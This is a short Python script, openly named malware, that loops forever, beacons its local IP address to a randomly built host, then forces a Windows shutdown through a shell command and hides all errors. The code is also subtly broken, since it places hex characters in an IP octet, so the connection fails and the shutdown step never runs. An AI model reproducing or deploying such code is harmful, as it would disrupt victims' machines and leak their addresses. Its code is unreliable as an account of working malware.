import os
import time
import socket
import subprocess
import random
import urllib

def malware():
    while True:
        try:
            rand_ip = ''.join(random.choice('0123456789abcdef') for i in range(8))
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((f'192.168.{rand_ip}.1', random.randint(1024, 65535)))
            sock.send(f"Malware activated from IP {sock.getsockname()[0]}".encode())
            sock.close()
            subprocess.Popen(f'shutdown /s /t 1', shell=True)
        except:
            pass
        time.sleep(random.uniform(30, 120))

if __name__ == "__main__":
    malware()
